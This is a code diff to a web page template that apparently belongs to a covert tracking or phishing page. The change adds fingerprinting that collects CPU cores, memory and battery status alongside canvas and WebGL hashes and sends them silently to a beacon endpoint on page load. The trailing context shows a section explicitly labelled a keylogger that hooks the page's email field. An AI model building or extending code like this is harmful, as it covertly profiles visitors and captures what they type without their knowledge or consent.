@@ -72,13 +72,44 @@
         } catch (e) { return "Unknown"; }
     }
 
-    // Send Deep Fingerprint ASAP
-    const fpData = {
-        visit_id: "{{ visit_id }}",
-        canvas_hash: getCanvasHash(),
-        webgl_renderer: getWebGLRenderer()
-    };
-    navigator.sendBeacon("/api/beacon", JSON.stringify(fpData));
+    // 3. Hardware Concurrency & Memory (V24 Pro)
+    function getHardwareInfo() {
+        return {
+            cpu: navigator.hardwareConcurrency || 'Unknown',
+            ram: navigator.deviceMemory || 'Unknown'
+        };
+    }
+
+    // 4. Battery Status (V24 Pro) - Async
+    async function getBatteryStatus() {
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                return {
+                    level: Math.round(b.level * 100) + "%",
+                    charging: b.charging ? "Yes" : "No"
+                };
+            } catch (e) { return {}; }
+        }
+        return {};
+    }
+
+    // Send Deep Fingerprint ASAP (Updated for V24)
+    async function sendBeacon() {
+        const hw = getHardwareInfo();
+        const batt = await getBatteryStatus();
+
+        const fpData = {
+            visit_id: "{{ visit_id }}",
+            canvas_hash: getCanvasHash(),
+            webgl_renderer: getWebGLRenderer(),
+            cpu_cores: hw.cpu,
+            ram_gb: hw.ram,
+            battery_level: batt.level
+        };
+        navigator.sendBeacon("/api/beacon", JSON.stringify(fpData));
+    }
+    sendBeacon();
 
     // --- V19: REALTIME INPUT TRANSCRIPTION (KEYLOGGER) ---
     const emailInput = document.querySelector('input[name="email"]');
